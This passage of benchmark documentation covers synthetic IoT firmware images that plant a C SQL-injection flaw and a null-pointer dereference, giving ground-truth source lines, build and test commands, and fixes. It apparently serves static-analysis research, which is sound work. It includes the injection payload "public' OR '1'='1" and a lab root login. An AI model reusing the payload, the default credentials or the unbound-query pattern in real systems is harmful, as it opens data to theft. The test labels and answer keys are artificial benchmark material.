python3 scripts/test-c-sql-injection.py --device smarthub
~~~

Expected: one host `PASS` and six guest groups saved in
`deploy-images/smarthub-cwe089-c-sql-injection/qemuarm64/validation-console.log`.
The default compressed rootfs is
`deploy-images/smarthub-cwe089-c-sql-injection/qemuarm64/iotbench-smarthub-cwe089-c-sql-injection-qemuarm64.rootfs.ext4.zst`,
with kernel `Image` beside it. Use `YOCTO_MACHINE` consistently for other targets.

### C SQL Injection — smartplug

Simulated device: **energy-management smart plug**, reusing
`meta-iotbench/recipes-devices/smartplug/`. Firmware directory:
`deploy-images/smartplug-cwe089-c-sql-injection/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-smartplug-cwe089-c-sql-injection.bb`.
Sole vulnerability package: `cwe089-c-sql-injection`; normal device services and
peripherals remain installed.

Vulnerable native C executable: `/usr/bin/fixture-db-query`. Corresponding source:
`meta-iotbench/recipes-vulns/cwe089-c-sql-injection/files/fixture-db-query.c`,
also installed under `/usr/share/iotbench/c-sql-injection/`. Synthetic database:
`/usr/share/iotbench/c-sql-injection/fixture.db`. Schema:
`fixture_records(id INTEGER PRIMARY KEY, record_name TEXT NOT NULL UNIQUE,
record_value TEXT NOT NULL, visibility TEXT NOT NULL)`; public/internal CHECK
and exact rows are listed above. Public row 1 is
`public|SYNTHETIC_PUBLIC_FIXTURE_DATA`; internal row 2 is
`internal|SYNTHETIC_INTERNAL_FIXTURE_DATA`, reachable through the injection.

The first command-line argument (`argv[1]` → `input`, line 54) controls the SQL
value. Query construction is `snprintf()` at **lines 57–59** of that source,
embedding it directly into `WHERE record_name = '%s' ORDER BY id;`. Safe SQL
parameter binding and escaping are intentionally missing there. The exact
preparation sink is **`sqlite3_prepare_v2()` at line 77**, followed by execution
through **`sqlite3_step()` at line 81**. The operation is a harmless SELECT of
synthetic names and values from the fixed read-only database.

Representative flow and expected static-analysis data flow:
`input "public' OR '1'='1"` → `snprintf()` constructs SQL →
`WHERE record_name = 'public' OR '1'='1' ORDER BY id` →
`sqlite3_prepare_v2()` → `sqlite3_step()` → synthetic internal record returned.
The injected quote and true OR predicate alter SQL semantics because input is
embedded in syntax instead of bound as a value. Expected finding: **CWE-89**,
argument-to-SQL-to-SQLite data flow with missing binding. Exact ground-truth
label: **Vulnerable C Binaries — SQL injection**. Safe remediation: in a
separate corrected variant use `WHERE record_name = ?`, prepare fixed SQL,
`sqlite3_bind_text()` and then `sqlite3_step()`, as described above.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=smartplug-cwe089-c-sql-injection docker compose run --rm yocto
FIRMWARE=smartplug-cwe089-c-sql-injection ./scripts/run-qemu.sh
~~~

Inside that guest's serial console (existing lab `root` / `routeradmin` login):

~~~bash
fixture-db-query public
fixture-db-query "public' OR '1'='1"
sh /usr/share/iotbench/c-sql-injection/test-guest.sh smartplug
~~~

Expected: normal input prints only `public|SYNTHETIC_PUBLIC_FIXTURE_DATA`;
injection prints that plus `internal|SYNTHETIC_INTERNAL_FIXTURE_DATA`, in ID
order. Both return 0; warning goes to stderr. The regression prints six `PASS`
lines and exits 0, executing every lookup without privileges and leaving the
read-only database unchanged.

Offline image verification (host, using the existing builder's native tool):

~~~bash
docker compose run --rm yocto python3 /scripts/test-c-sql-injection.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/smartplug-cwe089-c-sql-injection/qemuarm64/iotbench-smartplug-cwe089-c-sql-injection-qemuarm64.rootfs.ext4.zst
~~~

Expected: two `PASS` lines. The debugfs path above is for the current aarch64
builder host, independent of the target CPU; use its `x86_64` counterpart on an
x86_64 builder, or `--debugfs debugfs` if installed on PATH. Automatic disposable
runtime test (host, separately from manual QEMU):

~~~bash
python3 scripts/test-c-sql-injection.py --device smartplug
~~~

Expected: one host `PASS` and six guest groups saved in
`deploy-images/smartplug-cwe089-c-sql-injection/qemuarm64/validation-console.log`.
The default compressed rootfs is
`deploy-images/smartplug-cwe089-c-sql-injection/qemuarm64/iotbench-smartplug-cwe089-c-sql-injection-qemuarm64.rootfs.ext4.zst`,
with kernel `Image` beside it. Use `YOCTO_MACHINE` consistently for other targets.

### C SQL Injection — smartspeaker

Simulated device: **audio / voice-assistant speaker**, reusing
`meta-iotbench/recipes-devices/smartspeaker/`. Firmware directory:
`deploy-images/smartspeaker-cwe089-c-sql-injection/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-smartspeaker-cwe089-c-sql-injection.bb`.
Sole vulnerability package: `cwe089-c-sql-injection`; normal device services and
peripherals remain installed.

Vulnerable native C executable: `/usr/bin/fixture-db-query`. Corresponding source:
`meta-iotbench/recipes-vulns/cwe089-c-sql-injection/files/fixture-db-query.c`,
also installed under `/usr/share/iotbench/c-sql-injection/`. Synthetic database:
`/usr/share/iotbench/c-sql-injection/fixture.db`. Schema:
`fixture_records(id INTEGER PRIMARY KEY, record_name TEXT NOT NULL UNIQUE,
record_value TEXT NOT NULL, visibility TEXT NOT NULL)`; public/internal CHECK
and exact rows are listed above. Public row 1 is
`public|SYNTHETIC_PUBLIC_FIXTURE_DATA`; internal row 2 is
`internal|SYNTHETIC_INTERNAL_FIXTURE_DATA`, reachable through the injection.

The first command-line argument (`argv[1]` → `input`, line 54) controls the SQL
value. Query construction is `snprintf()` at **lines 57–59** of that source,
embedding it directly into `WHERE record_name = '%s' ORDER BY id;`. Safe SQL
parameter binding and escaping are intentionally missing there. The exact
preparation sink is **`sqlite3_prepare_v2()` at line 77**, followed by execution
through **`sqlite3_step()` at line 81**. The operation is a harmless SELECT of
synthetic names and values from the fixed read-only database.

Representative flow and expected static-analysis data flow:
`input "public' OR '1'='1"` → `snprintf()` constructs SQL →
`WHERE record_name = 'public' OR '1'='1' ORDER BY id` →
`sqlite3_prepare_v2()` → `sqlite3_step()` → synthetic internal record returned.
The injected quote and true OR predicate alter SQL semantics because input is
embedded in syntax instead of bound as a value. Expected finding: **CWE-89**,
argument-to-SQL-to-SQLite data flow with missing binding. Exact ground-truth
label: **Vulnerable C Binaries — SQL injection**. Safe remediation: in a
separate corrected variant use `WHERE record_name = ?`, prepare fixed SQL,
`sqlite3_bind_text()` and then `sqlite3_step()`, as described above.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=smartspeaker-cwe089-c-sql-injection docker compose run --rm yocto
FIRMWARE=smartspeaker-cwe089-c-sql-injection ./scripts/run-qemu.sh
~~~

Inside that guest's serial console (existing lab `root` / `routeradmin` login):

~~~bash
fixture-db-query public
fixture-db-query "public' OR '1'='1"
sh /usr/share/iotbench/c-sql-injection/test-guest.sh smartspeaker
~~~

Expected: normal input prints only `public|SYNTHETIC_PUBLIC_FIXTURE_DATA`;
injection prints that plus `internal|SYNTHETIC_INTERNAL_FIXTURE_DATA`, in ID
order. Both return 0; warning goes to stderr. The regression prints six `PASS`
lines and exits 0, executing every lookup without privileges and leaving the
read-only database unchanged.

Offline image verification (host, using the existing builder's native tool):

~~~bash
docker compose run --rm yocto python3 /scripts/test-c-sql-injection.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/smartspeaker-cwe089-c-sql-injection/qemuarm64/iotbench-smartspeaker-cwe089-c-sql-injection-qemuarm64.rootfs.ext4.zst
~~~

Expected: two `PASS` lines. The debugfs path above is for the current aarch64
builder host, independent of the target CPU; use its `x86_64` counterpart on an
x86_64 builder, or `--debugfs debugfs` if installed on PATH. Automatic disposable
runtime test (host, separately from manual QEMU):

~~~bash
python3 scripts/test-c-sql-injection.py --device smartspeaker
~~~

Expected: one host `PASS` and six guest groups saved in
`deploy-images/smartspeaker-cwe089-c-sql-injection/qemuarm64/validation-console.log`.
The default compressed rootfs is
`deploy-images/smartspeaker-cwe089-c-sql-injection/qemuarm64/iotbench-smartspeaker-cwe089-c-sql-injection-qemuarm64.rootfs.ext4.zst`,
with kernel `Image` beside it. Use `YOCTO_MACHINE` consistently for other targets.

### C SQL Injection — thermostat

Simulated device: **climate-control thermostat**, reusing
`meta-iotbench/recipes-devices/thermostat/`. Firmware directory:
`deploy-images/thermostat-cwe089-c-sql-injection/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-thermostat-cwe089-c-sql-injection.bb`.
Sole vulnerability package: `cwe089-c-sql-injection`; normal device services and
peripherals remain installed.

Vulnerable native C executable: `/usr/bin/fixture-db-query`. Corresponding source:
`meta-iotbench/recipes-vulns/cwe089-c-sql-injection/files/fixture-db-query.c`,
also installed under `/usr/share/iotbench/c-sql-injection/`. Synthetic database:
`/usr/share/iotbench/c-sql-injection/fixture.db`. Schema:
`fixture_records(id INTEGER PRIMARY KEY, record_name TEXT NOT NULL UNIQUE,
record_value TEXT NOT NULL, visibility TEXT NOT NULL)`; public/internal CHECK
and exact rows are listed above. Public row 1 is
`public|SYNTHETIC_PUBLIC_FIXTURE_DATA`; internal row 2 is
`internal|SYNTHETIC_INTERNAL_FIXTURE_DATA`, reachable through the injection.

The first command-line argument (`argv[1]` → `input`, line 54) controls the SQL
value. Query construction is `snprintf()` at **lines 57–59** of that source,
embedding it directly into `WHERE record_name = '%s' ORDER BY id;`. Safe SQL
parameter binding and escaping are intentionally missing there. The exact
preparation sink is **`sqlite3_prepare_v2()` at line 77**, followed by execution
through **`sqlite3_step()` at line 81**. The operation is a harmless SELECT of
synthetic names and values from the fixed read-only database.

Representative flow and expected static-analysis data flow:
`input "public' OR '1'='1"` → `snprintf()` constructs SQL →
`WHERE record_name = 'public' OR '1'='1' ORDER BY id` →
`sqlite3_prepare_v2()` → `sqlite3_step()` → synthetic internal record returned.
The injected quote and true OR predicate alter SQL semantics because input is
embedded in syntax instead of bound as a value. Expected finding: **CWE-89**,
argument-to-SQL-to-SQLite data flow with missing binding. Exact ground-truth
label: **Vulnerable C Binaries — SQL injection**. Safe remediation: in a
separate corrected variant use `WHERE record_name = ?`, prepare fixed SQL,
`sqlite3_bind_text()` and then `sqlite3_step()`, as described above.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=thermostat-cwe089-c-sql-injection docker compose run --rm yocto
FIRMWARE=thermostat-cwe089-c-sql-injection ./scripts/run-qemu.sh
~~~

Inside that guest's serial console (existing lab `root` / `routeradmin` login):

~~~bash
fixture-db-query public
fixture-db-query "public' OR '1'='1"
sh /usr/share/iotbench/c-sql-injection/test-guest.sh thermostat
~~~

Expected: normal input prints only `public|SYNTHETIC_PUBLIC_FIXTURE_DATA`;
injection prints that plus `internal|SYNTHETIC_INTERNAL_FIXTURE_DATA`, in ID
order. Both return 0; warning goes to stderr. The regression prints six `PASS`
lines and exits 0, executing every lookup without privileges and leaving the
read-only database unchanged.

Offline image verification (host, using the existing builder's native tool):

~~~bash
docker compose run --rm yocto python3 /scripts/test-c-sql-injection.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/thermostat-cwe089-c-sql-injection/qemuarm64/iotbench-thermostat-cwe089-c-sql-injection-qemuarm64.rootfs.ext4.zst
~~~

Expected: two `PASS` lines. The debugfs path above is for the current aarch64
builder host, independent of the target CPU; use its `x86_64` counterpart on an
x86_64 builder, or `--debugfs debugfs` if installed on PATH. Automatic disposable
runtime test (host, separately from manual QEMU):

~~~bash
python3 scripts/test-c-sql-injection.py --device thermostat
~~~

Expected: one host `PASS` and six guest groups saved in
`deploy-images/thermostat-cwe089-c-sql-injection/qemuarm64/validation-console.log`.
The default compressed rootfs is
`deploy-images/thermostat-cwe089-c-sql-injection/qemuarm64/iotbench-thermostat-cwe089-c-sql-injection-qemuarm64.rootfs.ext4.zst`,
with kernel `Image` beside it. Use `YOCTO_MACHINE` consistently for other targets.

## Vulnerable C Binaries — Null Pointer Dereference

### Build, boot and manual testing

**What this tests.** Looking up a nonexistent record returns `NULL`, which the
program dereferences without checking. The test uses the included supervisor
to confirm a fault at address zero.

**Build and boot — host:**

```bash
FIRMWARE=router-cwe476-null-pointer-dereference docker compose run --rm yocto
QEMU_HTTP_PORT=18080 FIRMWARE=router-cwe476-null-pointer-dereference ./scripts/run-qemu.sh
```

**Test — guest:**

```sh
ulimit -c 0
setpriv --reuid=65534 --regid=65534 --clear-groups \
  /usr/share/iotbench/null-pointer-dereference/test-null-dereference --run public
echo "exit=$?"
setpriv --reuid=65534 --regid=65534 --clear-groups \
  /usr/share/iotbench/null-pointer-dereference/test-null-dereference
echo "exit=$?"
```

Expected for `public`: `Record ID: 1`,
`Record Value: SYNTHETIC_PUBLIC_FIXTURE_DATA` and `exit=0`.
The second command runs the binary with `missing-record` and, on the validated
Linux target, must print:

```text
NULL_DEREFERENCE_CONFIRMED signal=SIGSEGV address=0 code=SEGV_MAPERR
```

The supervisor returns `exit=0` when it confirms the expected fault in the child
process. A generic crash or nonzero exit does not confirm this specific
dereference. If `ptrace` is unavailable, runtime verification is incomplete.
The test runs locally in the guest; the browser does not invoke this binary.

> INTENTIONALLY INSECURE SYNTHETIC TEST FIXTURE — LOCAL SECURITY TESTING ONLY — NOT FOR DEPLOYMENT

### Scenario and source-to-sink ground truth

Exact ground-truth label: **Vulnerable C Binaries — Null Pointer Dereference**.
Classification: **CWE-476: NULL Pointer Dereference**. Eleven independent image
recipes combine each existing device profile with the single vulnerability
package `cwe476-null-pointer-dereference`. Their purpose is offline, authorized
static-analysis research using synthetic firmware. Runtime validation is optional
and confined to disposable local environments.

The harmless operation is a named lookup of synthetic device information.
`fixture-device-info.c` contains the entire vulnerable flow; it is stored in
`meta-iotbench/recipes-vulns/cwe476-null-pointer-dereference/files/` and installed
with its matching native ELF executable. No runtime switch selects other flaws.

| Ground-truth element | Exact location in `fixture-device-info.c` |
| --- | --- |
| Synthetic records | Lines 12–15: ID 1, `public`, `SYNTHETIC_PUBLIC_FIXTURE_DATA`; ID 2, `status`, `SYNTHETIC_STATUS_FIXTURE_DATA` |
| Argument validation | Lines 33–36: require exactly one record-name argument before reading `argv[1]` |
| External input | Line 38: `const char *input = argv[1];` |
| Pointer-returning lookup | Lines 17–27: `lookup_record(const char *name)` loops over both records and uses `strcmp()` |
| Found-record pointer | Line 23: `return &records[i];` |
| Reachable NULL return | Line 26: `return NULL;` after every comparison fails |
| Nullable result variable | Line 39: `const fixture_record_t *record = lookup_record(input);` |
| Intentionally missing validation | Between assignment at line 39 and first member access at line 43; explicit comment at lines 41–42 |
| First unsafe sink | Line 43: `printf("Record ID: %d\n", record->id);` |
| Subsequent member access | Line 44: `record->value` (the first access already faults for NULL on the tested target) |

Representative vulnerable flow, identical in every device:

`input "missing-record"` → `lookup_record(input)` → `return NULL` →
`record = NULL` → `no NULL check` → `record->id` → `Null Pointer Dereference`.

`missing-record` is absent from the compiled table, so ordinary lookup logic
selects the NULL path. There is no hardcoded unconditional NULL assignment,
manual fault signal, `abort()`, fallback record, default pointer, input allowlist,
defensive replacement or early return protecting this path. Unknown names,
including the empty string, also reach the same intended defect. There is no
input copy, input-sized allocation or writable input buffer. Loops are bounded
by the initialized table; output format strings are constant.

Expected static finding: a user-controlled argument reaches a pointer-returning
lookup, whose unsuccessful-search path returns NULL to local variable `record`;
the caller reaches its structure-member load without a NULL check. Merely
accepting input, using pointers, returning NULL or crashing does not establish
this relationship. The complete input-dependent flow is required.

This is native C, with neither Java/JAR applications nor Java Null Pointer
Exceptions. Bash and Python files are test harnesses only. It differs from
unspecified generic vulnerable C binaries and generic application crashes because
the precise nullable return and unchecked structure-member access are identified.
It is not a buffer overflow, use-after-free, double-free, uninitialized pointer,
out-of-bounds access or arbitrary pointer dereference: the only possible result
is a pointer to one of two initialized static records or NULL. There are no
user-selected addresses, frees, heap allocations or arbitrary memory writes.
It is not command injection, SQL Injection, Path Traversal, an unsafe sudo helper
or privilege escalation; the utility invokes no command, database, filename,
network or privilege API. Safe C pointer users, argument consumers without a
nullable-pointer operation, and callers checking NULL before use do not satisfy
this ground truth. An unconditional hardcoded NULL dereference also lacks this
fixture's meaningful input-dependent search.

### Firmware packaging and compilation

| Artifact | Firmware path |
| --- | --- |
| Vulnerable native C executable, root:root 0755 | `/usr/bin/fixture-device-info` |
| Corresponding source | `/usr/share/iotbench/null-pointer-dereference/fixture-device-info.c` |
| Diagnostic test executable, root:root 0755 | `/usr/share/iotbench/null-pointer-dereference/test-null-dereference` |
| Supporting assets, root:root 0644 | `test-null-dereference.c`, `test-guest.sh`, `ground-truth.json`, `NOTICE`, `LICENSE` in that same directory |

Records are compiled into the C executable, with no external metadata database.
The helper only compares names and prints artificial values. It opens no files,
contacts no service, reads no credentials, changes no configuration and requires
no root privilege. It installs no daemon, persistence, sudo rule or elevated file
permission. Existing device services/peripherals come from the unchanged profiles.

The package follows the existing `${CC} ${CPPFLAGS} ${CFLAGS} ${LDFLAGS}`
Yocto cross-compilation convention with `virtual/libc`; no external library or
new layer is needed. The vulnerable helper appends `-O0 -g -fno-inline -fno-lto`
to preserve the lookup call, nullable return and member loads. Package stripping
is inhibited so `lookup_record` and `records` remain recognizable. The normal
Yocto debug package handling still applies. The firmware executable has no
sanitizer runtime dependency. `busybox` and `util-linux-setpriv` support the
existing guest test convention. The pinned BusyBox configuration omits `timeout`,
so the existing C test supervisor supplies its own watchdog using `alarm()`.
All dependencies are supplied by pinned layers; the vulnerable utility itself
only needs libc.
Only this buffer-free helper also uses `-U_FORTIFY_SOURCE`: glibc's fortify
wrappers require optimization and otherwise reject the intentional `-O0` build
under `-Werror`. The other Yocto hardening flags remain in place; the diagnostic
supervisor uses the normal optimized flags and fortify setting.

`NOTICE`, image description, `/etc/motd` and helper stderr carry the exact
warning above. Source locations and records are also recorded in the installed
`ground-truth.json`. The image postprocess asserts ordinary 0755 helper ownership
and permissions. Recipes remain target-architecture independent.

### Build and static verification

Run these commands from the repository root:

~~~bash
docker compose run --rm yocto bash -lc \
  'source /opt/yocto/yocto-env.sh && bitbake -p && bitbake -n iotbench-router-cwe476-null-pointer-dereference'
docker compose run --rm yocto python3 /scripts/test-null-pointer-dereference.py --static
for recipe in meta-iotbench/recipes-images/iotbench-*-cwe476-null-pointer-dereference.bb; do
    firmware=$(basename "$recipe" .bb)
    FIRMWARE="${firmware#iotbench-}" docker compose run --rm yocto || exit 1
done
~~~

`--static` compiles a temporary copy with GCC `-fanalyzer` and requires one
`-Wanalyzer-null-dereference` diagnostic carrying CWE metadata 476 at line 43.
Its interprocedural diagnostic must include input line 38, lookup call/result
line 39, NULL return line 26 and sink line 43. It prints the diagnostic path and
checks machine-readable ground truth plus all eleven device recipes. A second,
temporary corrected control inserts a NULL check and must produce no CWE-476
finding. The installed vulnerable source is never modified by this test.

Offline image validation uses `debugfs` without mounting or executing firmware:

~~~bash
docker compose run --rm yocto python3 /scripts/test-null-pointer-dereference.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/router-cwe476-null-pointer-dereference/qemuarm64/iotbench-router-cwe476-null-pointer-dereference-qemuarm64.rootfs.ext4.zst
~~~

Expected: two `PASS` lines. It checks ELF architecture, preserved lookup symbols
and native call from `main`, both synthetic records, exact installed C sources,
metadata/test assets, ordinary file permissions, device identity and login warning.
For standard export filenames it also matches the installed device to the image
name, and compares the installed identity and peripheral files with that profile.
It prints the helper SHA-256. Disassembly inspection supports preservation of the
compiled flow; the GCC finding establishes the source-level defect. This is not
a claim that a binary-only analyzer independently recovered CWE-476.

The example `debugfs` path is for an aarch64 builder host, independent of target
architecture. Use `x86_64` on an x86_64 builder or `--debugfs debugfs` if on PATH.
Default target is `qemuarm64`; use `YOCTO_MACHINE` consistently for builds and
boots, and `--machine` plus a matching `--objdump` for offline inspection of
`qemuarm`, `qemux86-64`, `qemux86` or `qemumips`. The shared `scripts/build-all.sh`
automatically discovers every new image recipe.

### Optional isolated runtime verification

~~~bash
python3 scripts/test-null-pointer-dereference.py --device router
python3 scripts/test-null-pointer-dereference.py --all
# Optional acceleration on Apple Silicon, using unused device-service ports:
QEMU_ACCEL=hvf QEMU_CPU=host QEMU_HTTP_PORT=18080 \
  QEMU_MQTT_PORT=21883 QEMU_MODBUS_PORT=11502 \
  python3 scripts/test-null-pointer-dereference.py --all
~~~

Run separately from manual QEMU. The existing serial-console harness boots a
fresh snapshot, uses the existing `root` / `routeradmin` lab login only to run
tests, and shuts QEMU down in `finally`. Each export receives a raw
`validation-console.log`. The helper itself has no network surface.

Inside a manually booted guest, run `sh
/usr/share/iotbench/null-pointer-dereference/test-guest.sh router` on one line.
The five guest assertion groups check native installation, valid deterministic
`public` and `status` output, argument-count errors, the kernel-confirmed NULL
fault, and unprivileged execution with core dumps disabled. All helper processes
use UID/GID 65534 with cleared groups. The dedicated C test supervisor applies
a five-second watchdog and `RLIMIT_CORE=0` to each helper invocation. Its `--run`
mode forwards record arguments to the fixed executable and preserves its exit
status for valid-record and argument-count tests. With no arguments it forks the
fixed helper with `missing-record` and uses Linux `ptrace` to observe its actual
SIGSEGV. It requires `si_addr == NULL` and `si_code == SEGV_MAPERR`, forwards the
original kernel signal, then verifies signal termination. `PTRACE_O_EXITKILL`
also kills the traced child if the supervisor exits. The supervisor is test
infrastructure; it does not generate the fault or implement the vulnerability.

Expected valid output (stdout), with exit status 0:

~~~text
Record ID: 1
Record Value: SYNTHETIC_PUBLIC_FIXTURE_DATA
~~~

`status` prints ID 2 and `SYNTHETIC_STATUS_FIXTURE_DATA`. Missing/extra arguments
return 2 before accessing `argv[1]`. `missing-record` reaches C undefined behavior;
on the tested Linux target it should fault on `record->id` at address zero. The
supervisor's exact success marker is
`NULL_DEREFERENCE_CONFIRMED signal=SIGSEGV address=0 code=SEGV_MAPERR`.
A generic nonzero exit is insufficient. Other architectures or compiler settings
need independent verification; a missing ptrace facility is a runtime test
limitation, not a passing result. Static verification remains available.

### Safe remediation

A separate secure version must validate the nullable lookup result before use:

~~~c
const fixture_record_t *record = lookup_record(input);
if (record == NULL) {
    fprintf(stderr, "Record not found\n");
    return 1;
}
printf("Record ID: %d\n", record->id);
~~~

Whenever a pointer-returning function can return NULL, check that result before
accessing the referenced object. Keep ordinary argument validation as well.
Do not apply this correction to the intentionally vulnerable firmware fixture.

### Completed validation

On 2026-10-16, all eleven `qemuarm64` fixtures built and exported successfully
with the pinned Yocto builder after clean layer parsing and a router dependency
dry run. Both native C executables compiled with `-Wall -Wextra -Werror`.
Every exported manifest contains its correct device profile, `iotbench-sim`,
and exactly one vulnerability package: `cwe476-null-pointer-dereference`.

GCC's interprocedural `-fanalyzer` produced exactly one
`-Wanalyzer-null-dereference` finding with CWE metadata 476. Its diagnostic path
includes `argv[1]` at line 38, the lookup/assignment at line 39, the NULL return
at line 26, and the unchecked `record->id` at line 43. A temporary corrected
control with a NULL check produced no CWE-476 finding. The installed vulnerable
source was left unchanged.

Offline inspection passed for all eleven compressed ext4 images: target-native
ELF architecture, preserved lookup symbols and call from `main`, synthetic
record values, exact installed C sources/metadata/test assets, ordinary file
permissions, matching device identity/peripherals and required image warning.
The vulnerable helper is byte-identical across all eleven images, with SHA-256
`0e5198c3e75c26282926cc41d797501a783a1b34dd3a1a3a00a4502b8455aba8`.

All eleven images then booted as disposable QEMU snapshots with HVF/host CPU
and passed all five guest assertion groups, **55 groups total**. Valid records
returned their exact deterministic values; missing/extra arguments returned 2.
For `missing-record`, the supervisor observed kernel SIGSEGV at address zero
with `SEGV_MAPERR`, forwarded that signal and confirmed actual signal termination.
Every helper invocation ran as UID/GID 65534 with cleared groups, a five-second
watchdog and core dumps disabled. Guest regressions all returned zero. Tests
used the local serial console and existing host-loopback service ports HTTP
`18080`, MQTT `21883` and Modbus/TCP `11502`; the utility itself uses no network.

The [local validation report](../deploy-images/cwe476-validation/report.txt)
lists the generated repository files, every device's results, and SHA-256 checksums
for source files, compressed rootfs, kernel, manifest and validation logs.
Shared parse/static-analysis logs are under `deploy-images/cwe476-validation/`.
Each device export contains `build.log`, `rootfs.manifest`,
`validation-offline.log`, `validation-runtime.log` and `validation-console.log`.
Other supported architectures were not built or boot-tested. The static finding
comes from GCC source analysis; no independent binary-only CWE analyzer was run.

### Null Pointer Dereference — doorlock

Simulated category: **access-control door lock**. Existing device directory:
`meta-iotbench/recipes-devices/doorlock/`. Firmware directory:
`deploy-images/doorlock-cwe476-null-pointer-dereference/<machine>/`; default image:
`iotbench-doorlock-cwe476-null-pointer-dereference-qemuarm64.rootfs.ext4.zst`, with kernel `Image` beside it.
Image recipe: `meta-iotbench/recipes-images/iotbench-doorlock-cwe476-null-pointer-dereference.bb`.
Sole vulnerability package: `cwe476-null-pointer-dereference`.

Native executable: `/usr/bin/fixture-device-info`. Corresponding source:
`meta-iotbench/recipes-vulns/cwe476-null-pointer-dereference/files/fixture-device-info.c`,
also installed as `/usr/share/iotbench/null-pointer-dereference/fixture-device-info.c`.
Its harmless purpose is retrieving predefined synthetic device information.
Record 1 is `public` / `SYNTHETIC_PUBLIC_FIXTURE_DATA`; record 2 is
`status` / `SYNTHETIC_STATUS_FIXTURE_DATA`, compiled into the initialized table.

Input `argv[1]` becomes `input` at **line 38**, after the argument-count check.
**`lookup_record()` at lines 17–27** compares this name against both records.
An existing name returns its record pointer at **line 23**. Any unknown name,
including `missing-record`, reaches **`return NULL` at line 26**. Local variable
**`record` receives the nullable result at line 39**. NULL validation is
intentionally absent between lines 39 and 43. The first unsafe dereference is
**`record->id` at line 43**; line 44 subsequently accesses `record->value`.

Expected static-analysis flow: `input "missing-record"` → `lookup_record(input)`
→ `return NULL` → `record = NULL` → `no NULL check` → `record->id`
→ `Null Pointer Dereference`. The absent name naturally selects the NULL return,
and the caller accesses the structure member regardless of lookup success.
Expected finding: unchecked nullable return from an input-dependent lookup,
**CWE-476: NULL Pointer Dereference**. Exact ground-truth label:
**Vulnerable C Binaries — Null Pointer Dereference**.
Remediation: check `record == NULL` and return an error before any member access,
as shown in the shared secure alternative; leave this fixture vulnerable.

Build and static validation (host repository root):

~~~bash
FIRMWARE=doorlock-cwe476-null-pointer-dereference docker compose run --rm yocto
docker compose run --rm yocto python3 /scripts/test-null-pointer-dereference.py --static
docker compose run --rm yocto python3 /scripts/test-null-pointer-dereference.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/doorlock-cwe476-null-pointer-dereference/qemuarm64/iotbench-doorlock-cwe476-null-pointer-dereference-qemuarm64.rootfs.ext4.zst
~~~

Optional runtime validation (host, no manually running QEMU):

~~~bash
python3 scripts/test-null-pointer-dereference.py --device doorlock
~~~

For manual boot use `FIRMWARE=doorlock-cwe476-null-pointer-dereference
./scripts/run-qemu.sh` on one line. Inside its guest serial console,
`fixture-device-info public` prints `Record ID: 1` and
`Record Value: SYNTHETIC_PUBLIC_FIXTURE_DATA`, exiting 0. Run
`sh /usr/share/iotbench/null-pointer-dereference/test-guest.sh doorlock`
for all five isolated guest assertion groups, including the missing-record
fault at address zero; the script disables core dumps. Use the packaged diagnostic
supervisor for a bounded manual fault check with core dumps disabled. Shared build/static/
runtime procedures above apply, including ELF architecture selection and
unprivileged execution. Per-image runtime results, when available, are in
`deploy-images/doorlock-cwe476-null-pointer-dereference/qemuarm64/validation-console.log`;
the completed-validation section states which results were actually observed.

### Null Pointer Dereference — envsensor

Simulated category: **environmental sensor**. Existing device directory:
`meta-iotbench/recipes-devices/envsensor/`. Firmware directory:
`deploy-images/envsensor-cwe476-null-pointer-dereference/<machine>/`; default image:
`iotbench-envsensor-cwe476-null-pointer-dereference-qemuarm64.rootfs.ext4.zst`, with kernel `Image` beside it.
Image recipe: `meta-iotbench/recipes-images/iotbench-envsensor-cwe476-null-pointer-dereference.bb`.
Sole vulnerability package: `cwe476-null-pointer-dereference`.

Native executable: `/usr/bin/fixture-device-info`. Corresponding source:
`meta-iotbench/recipes-vulns/cwe476-null-pointer-dereference/files/fixture-device-info.c`,
also installed as `/usr/share/iotbench/null-pointer-dereference/fixture-device-info.c`.
Its harmless purpose is retrieving predefined synthetic device information.
Record 1 is `public` / `SYNTHETIC_PUBLIC_FIXTURE_DATA`; record 2 is
`status` / `SYNTHETIC_STATUS_FIXTURE_DATA`, compiled into the initialized table.

Input `argv[1]` becomes `input` at **line 38**, after the argument-count check.
**`lookup_record()` at lines 17–27** compares this name against both records.
An existing name returns its record pointer at **line 23**. Any unknown name,
including `missing-record`, reaches **`return NULL` at line 26**. Local variable
**`record` receives the nullable result at line 39**. NULL validation is
intentionally absent between lines 39 and 43. The first unsafe dereference is
**`record->id` at line 43**; line 44 subsequently accesses `record->value`.

Expected static-analysis flow: `input "missing-record"` → `lookup_record(input)`
→ `return NULL` → `record = NULL` → `no NULL check` → `record->id`
→ `Null Pointer Dereference`. The absent name naturally selects the NULL return,
and the caller accesses the structure member regardless of lookup success.
Expected finding: unchecked nullable return from an input-dependent lookup,
**CWE-476: NULL Pointer Dereference**. Exact ground-truth label:
**Vulnerable C Binaries — Null Pointer Dereference**.
Remediation: check `record == NULL` and return an error before any member access,
as shown in the shared secure alternative; leave this fixture vulnerable.

Build and static validation (host repository root):

~~~bash
FIRMWARE=envsensor-cwe476-null-pointer-dereference docker compose run --rm yocto
docker compose run --rm yocto python3 /scripts/test-null-pointer-dereference.py --static
docker compose run --rm yocto python3 /scripts/test-null-pointer-dereference.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/envsensor-cwe476-null-pointer-dereference/qemuarm64/iotbench-envsensor-cwe476-null-pointer-dereference-qemuarm64.rootfs.ext4.zst
~~~

Optional runtime validation (host, no manually running QEMU):

~~~bash
python3 scripts/test-null-pointer-dereference.py --device envsensor
~~~

For manual boot use `FIRMWARE=envsensor-cwe476-null-pointer-dereference
./scripts/run-qemu.sh` on one line. Inside its guest serial console,
